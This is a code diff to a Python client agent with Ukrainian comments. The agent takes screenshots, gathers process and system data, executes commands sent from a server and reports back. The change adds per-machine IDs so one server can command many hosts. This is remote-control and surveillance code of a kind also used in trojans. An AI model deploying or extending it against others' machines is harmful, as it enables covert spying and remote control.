@@ -5,10 +5,15 @@ import base64
 import subprocess
 import requests
 import psutil
+import uuid
+import socket
 from PIL import ImageGrab
 
 # ⚙️ ВКАЖИ ТУТ IP ТА ПОРТ СВОГО СЕРВЕРА!
 SERVER_URL = "http://127.0.0.1:5000"
+
+# Генеруємо унікальний ID для цього ПК (щоб сервер міг підтримувати багато клієнтів)
+HWID = f"{socket.gethostname()}-{uuid.getnode()}"
 
 def get_screenshot_b64():
     try:
@@ -40,7 +45,7 @@ def execute_cmd(command):
         return f"Помилка виконання: {str(e)}"
 
 def run_agent():
-    print(f"🤖 Агент запущено. Підключення до сервера: {SERVER_URL}")
+    print(f"🤖 Агент запущено. ПК: {socket.gethostname()}. Підключення до сервера: {SERVER_URL}")
     last_cmd_out = None
     
     while True:
@@ -52,6 +57,8 @@ def run_agent():
             procs = get_processes()
             
             payload = {
+                'hwid': HWID,                 # <--- Додали ІДЕНТИФІКАТОР
+                'hostname': socket.gethostname(), # <--- Ім'я ПК
                 'cpu': cpu,
                 'ram': ram,
                 'screenshot': screen_b64,
@@ -60,7 +67,7 @@ def run_agent():
             }
             last_cmd_out = None # Очищаємо після відправки
 
-            # 2. Надсилаємо звіти на сервер і отримуємо нові команди
+            # 2. Надсилаємо звіти на сервер і отримуємо персональні команди
             response = requests.post(f"{SERVER_URL}/api/agent/report", json=payload, timeout=5)
             
             if response.status_code == 200:
